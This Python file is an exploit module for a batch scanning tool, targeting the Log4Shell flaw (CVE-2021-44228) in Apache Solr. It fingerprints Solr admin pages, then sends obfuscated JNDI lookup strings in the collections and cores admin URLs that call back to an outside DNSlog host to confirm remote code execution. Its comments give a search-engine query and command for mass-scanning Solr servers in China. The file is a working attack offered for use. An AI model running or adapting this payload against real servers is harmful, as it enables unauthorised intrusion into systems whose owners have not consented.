# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-10 14:14

from core.data import gLogger
from core.utils.dnslog import get_eyes_identifier, eyes_dnslog_verify
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: "app=\"solr\" && country=\"CN\""
# python3 batch.py -m exploit.scripts.Apache.Solr.apache-solr-log4j-jndi -fs "app=\"APACHE-Solr\" && country=\"CN\"" -cs

class Script(BaseScript):
    name = 'Apache Solr'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CVE-2021-44228'
        # 来源
        self.bug_refer = 'https://github.com/Phuong39/2022-HW-POC/blob/main/goby_pocs/Apache%20Solr%20Log4j%20JNDI%20RCE.go'
        # 特定路径判断
        self.detect_path_list = ['/solr/', '/']
        # exec
        self.exec_path_list = ['/solr/admin/collections?action=$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-r%7D$%7B::-m%7D$%7B::-i%7D://{}.{}/a%7D', '/solr/admin/cores?action=$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-r%7D$%7B::-m%7D$%7B::-i%7D://{}.{}/a%7D']
        # 相关信息
        self.info = 'Apache Solr 7+ - Log4j Remote Code Execution'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '<title>Solr Admin</title>' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
        
    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                verify_random_int = random.randint(10000, 99999)
                exec_path = exec_path.format(verify_random_int, get_eyes_identifier())
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                await asyncio.sleep(2)
                text = await eyes_dnslog_verify('dns', verify_random_int)
                if text is not None and text:
                    gLogger.myscan_info('[{} Solr Log4j Verify:{}] {}'.format(self.name, verify_random_int, url))
                    return {'name': '{} Solr Log4j Verify:{}'.format(self.name, verify_random_int), 'url': url, 'software': self.name}